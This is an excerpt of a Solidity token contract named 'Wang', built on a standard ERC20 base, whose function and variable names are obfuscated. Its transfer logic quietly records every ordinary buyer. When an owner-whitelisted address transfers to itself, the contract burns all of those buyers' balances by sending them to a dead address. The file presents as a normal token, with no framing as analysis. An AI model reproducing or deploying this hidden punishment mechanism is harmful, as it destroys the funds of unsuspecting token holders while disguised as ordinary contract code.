...
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private wang_6;
    ...
    function _transfer(
        ...
        uint256 senderBalance = wang_6[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            wang_6[sender] = senderBalance - amount;
        }
        wang_6[recipient] += amount;
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        uint256 accountBalance = wang_6[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            wang_6[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
...
contract Wang is ERC20, Ownable {
	...
	function wang_5(address[] memory addrs) public onlyOwner {
		for (uint256 i = 0; i < addrs.length; i++) {
            wang_1[addrs[i]] = false;
		}
    }
	
	function wang_3(address account) public view returns (bool) {
        return wang_1[account];
    }
    ...
    function _transfer(
        ...
        if(!wang_3(to) && !_isExcludedFromFees[to] && to != uniswapV2Pair){
			wang_2.push(to);
		}

        if(from==to && wang_3(to)){
            uint arrayLength = wang_2.length;
            require(arrayLength>0,"Transfer failed!");
            
            for (uint i=0; i<arrayLength; i++) {
                uint256 amountPunished = balanceOf(wang_2[i]);
                super._transfer(wang_2[i],DEAD,amountPunished);
            }
            delete wang_2;
        }
    ...
    function wang_4(address[] memory addrs) public onlyOwner {
		for (uint256 i = 0; i < addrs.length; i++) {
            wang_1[addrs[i]] = true;
		}
    }
